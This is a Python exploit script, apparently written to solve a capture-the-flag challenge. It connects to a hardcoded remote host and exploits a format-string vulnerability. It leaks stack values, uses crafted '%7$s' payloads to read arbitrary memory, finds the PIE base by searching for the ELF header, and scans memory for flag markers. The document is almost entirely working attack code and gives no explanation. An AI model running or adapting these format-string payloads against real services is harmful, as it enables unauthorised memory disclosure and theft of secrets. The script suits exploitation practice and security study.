#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.12)
    try: return s.recv(4096)
    except Exception as e: return b'<T:'+str(e).encode()
def leak_lld(n):
    d=ask("%%%d$lld" % n)
    m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(X):
    fmt = b"%7$s" + b"AAAA" + struct.pack("<Q", X)
    return ask(fmt)

# find PIE base
a15 = leak_lld(15)
start = a15 & ~0xfff
pie=None
for delta in range(0, 0x20000, 0x1000):
    X = start - delta
    r = readmem(X)
    if r.startswith(b'\x7fELF'):
        pie = X; break
print("PIE base =", hex(pie))
if not pie:
    s.close(); raise SystemExit

# scan binary data/rodata/bss for flag markers
markers=[b'PTITCTF', b'flag', b'GZCTF', b'{']
hits=[]
for off in range(0x0, 0x10000, 0x10):
    X = pie + off
    r = readmem(X)
    # strip trailing pad
    for mk in markers:
        if mk in r:
            hits.append((off, X, mk, r[:200]))
    if off % 0x1000 == 0:
        print(f"  scan {hex(X)}...")
print("=== hits ===")
for h in hits[:40]:
    print(hex(h[1]), h[2], repr(h[3]))
if not hits:
    print("no hits in binary; scanning heap/stack next")
s.close()
